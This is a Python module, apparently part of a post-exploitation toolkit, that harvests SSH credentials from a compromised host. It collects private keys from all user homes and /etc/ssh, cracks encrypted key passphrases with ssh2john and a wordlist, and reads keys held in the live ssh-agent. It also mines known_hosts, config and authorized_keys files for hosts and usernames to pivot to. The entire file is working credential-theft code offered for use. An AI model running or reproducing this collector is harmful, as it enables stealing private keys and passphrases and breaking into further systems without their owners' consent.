"""SSH loot: private keys (all homes + /etc/ssh), authorized_keys/known_hosts/
config (pivot targets), and keys loaded in the running agent.

Encrypted private keys are flagged for ssh2john; known_hosts/config give you the
next hosts and usernames to pivot to."""
from __future__ import annotations

import os
import re
from typing import List

from core.secret import Secret, Status
from core.tools import (read_text, home_dirs, user_of_home, find_files,
                        which, run, realpath)
from core import cracker
from .base import BaseCollector

KEY_HDR = re.compile(r"-----BEGIN (OPENSSH|RSA|DSA|EC|PRIVATE) .*PRIVATE KEY-----")
ENCRYPTED = re.compile(r"ENCRYPTED|bcrypt|Proc-Type: 4,ENCRYPTED")
PRIV_NAME = re.compile(r"^(id_(rsa|dsa|ecdsa|ed25519)|.*\.pem|.*\.key|identity)$", re.I)


class SshCollector(BaseCollector):
    name = "SSH"
    description = "SSH private keys, authorized_keys/known_hosts/config, agent keys"

    def collect(self) -> List[Secret]:
        found: List[Secret] = []
        roots = []
        for h in home_dirs():
            roots.append(os.path.join(h, ".ssh"))
        roots += ["/etc/ssh"]

        # private keys
        enc_for_crack = []
        for f in find_files(roots, PRIV_NAME, max_depth=2):
            txt = read_text(f, max_bytes=64 * 1024)
            if not txt or not KEY_HDR.search(txt):
                continue
            owner = user_of_home(os.path.dirname(os.path.dirname(f)))
            if ENCRYPTED.search(txt):
                found.append(Secret("SSH", owner, f, Status.KEY,
                                    secret_type="ssh-key-enc", target=f,
                                    notes="encrypted key; crack: ssh2john -> john"))
                enc_for_crack.append(f)
            else:
                found.append(Secret("SSH", owner, f, Status.KEY,
                                    secret_type="ssh-key", target=f,
                                    notes="usable private key; ssh -i"))

        # authorized_keys / known_hosts / config -> pivot info
        for h in home_dirs():
            for fn, note in (("authorized_keys", "accounts that trust a key you may hold"),
                             ("config", "configured SSH targets/users/identityfile"),
                             ("known_hosts", "previously connected hosts (pivot targets)")):
                p = os.path.join(h, ".ssh", fn)
                txt = read_text(p)
                if not txt:
                    continue
                for line in txt.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    found.append(Secret("SSH", user_of_home(h), line[:120],
                                        Status.INFO, secret_type=fn, target=p,
                                        notes=note))

        # agent (LIVE only - offline, agent state comes from the bundle's meta)
        if not self.offline and which("ssh-add"):
            r = run(["ssh-add", "-l"], timeout=10)
            if r.rc == 0 and "no identities" not in r.output.lower():
                for line in r.output.splitlines():
                    if line.strip():
                        found.append(Secret("SSH", "", line.strip(), Status.INFO,
                                            secret_type="agent-key",
                                            notes="key in ssh-agent; usable now"))

        # optional crack of encrypted keys via ssh2john
        if self.crack_enabled and enc_for_crack and which("ssh2john"):
            lines = []
            for f in enc_for_crack:
                r = run(["ssh2john", realpath(f)], timeout=30)
                for ln in r.output.splitlines():
                    if ln.strip() and ":" in ln:
                        lines.append(ln.strip())
            cracked = cracker.crack(lines, self.wordlist)
            for ident, pw in cracked.items():
                found.append(Secret("SSH", "", pw, Status.CRACKED,
                                    secret_type="ssh-key-pass", target=ident,
                                    notes="cracked key passphrase"))
        return found
